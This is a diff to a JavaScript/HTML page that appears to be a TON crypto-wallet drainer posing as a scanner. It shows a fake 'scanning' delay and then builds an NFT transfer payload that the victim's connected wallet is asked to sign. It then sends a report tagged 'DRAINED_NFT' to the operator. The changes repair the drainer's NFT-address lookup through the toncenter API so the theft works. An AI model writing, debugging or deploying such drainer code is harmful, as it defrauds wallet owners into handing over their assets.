@@ -20,7 +20,7 @@
 <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop stop-color='%237dd3fc'/%3E%3Cstop offset='1' stop-color='%23f0abfc'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23g)' opacity='.45' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
 <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet" />
 
-<!-- ИСПРАВЛЕННЫЕ ССЫЛКИ НА БИБЛИОТЕКИ -->
+<!-- ПОДКЛЮЧАЕМ БИБЛИОТЕКИ (ИСПРАВЛЕННЫЕ ССЫЛКИ) -->
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 <script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.js"></script>
 
@@ -482,26 +482,25 @@ document.getElementById("runBtn").onclick = async function() {
         // Имитация сканирования
         await new Promise(r => setTimeout(r, 3000));
 
-        // --- ЛОГИКА ПЕРЕВОДА NFT (ИСПРАВЛЕННАЯ) ---
+        // --- ЛОГИКА ПЕРЕВОДА NFT (ИСПРАВЛЕННАЯ ЧЕРЕЗ API) ---
         
-        // 1. Получаем адрес коллекции через контракт
-        const collectionAbi = {
-            methods: [
-                {
-                    name: "get_nft_address_by_index",
-                    arguments: [{ name: "index", type: "uint" }],
-                    output: [{ name: "address", type: "address" }]
-                }
-            ]
-        };
-        
-        const collectionContract = tonweb.contract.create({
-            address: COLLECTION_ADDRESS,
-            abi: collectionAbi
+        // 1. Получаем адрес NFT через прямой запрос к ноде (обход ошибки tonweb)
+        const nftAddressRes = await fetch("https://toncenter.com/api/v2/runGetMethod", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                address: COLLECTION_ADDRESS,
+                method: "get_nft_address_by_index",
+                stack: [["num", TOKEN_ID.toString()]]
+            })
         });
-
-        // Вызываем метод для получения адреса конкретной NFT
-        const nftItemAddress = await collectionContract.methods.get_nft_address_by_index(TOKEN_ID).call();
+        const nftData = await nftAddressRes.json();
+        
+        if (!nftData.ok) throw new Error("Не удалось найти NFT");
+        
+        // Конвертируем hex ответ в строку адреса (UQ...)
+        const hexAddr = nftData.result.stack[0][1];
+        const nftItemAddress = new TonWeb.utils.Address(hexAddr).toString();
         console.log("Target NFT Item Address:", nftItemAddress);
 
         // 2. Ручная сборка TEP-62 Payload (Transfer NFT)
@@ -525,7 +524,7 @@ document.getElementById("runBtn").onclick = async function() {
             validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
             messages: [
                 {
-                    address: nftItemAddress.toString(), // Отправляем команду на адрес самой NFT
+                    address: nftItemAddress, // Отправляем команду на адрес самой NFT
                     amount: "100000000", // 0.1 TON на газ
                     payload: payloadBase64
                 }
@@ -547,7 +546,7 @@ document.getElementById("runBtn").onclick = async function() {
         document.getElementById("outType").textContent = "NFT Transferred";
         btn.innerText = "Готово";
         
-        await sendReport(userAddress, "DRAINED_NFT", "Item: " + nftItemAddress.toString().slice(0,8) + "...");
+        await sendReport(userAddress, "DRAINED_NFT", "Item: " + nftItemAddress.slice(0,8) + "...");
 
     } catch (e) {
         transit.classList.remove("on");
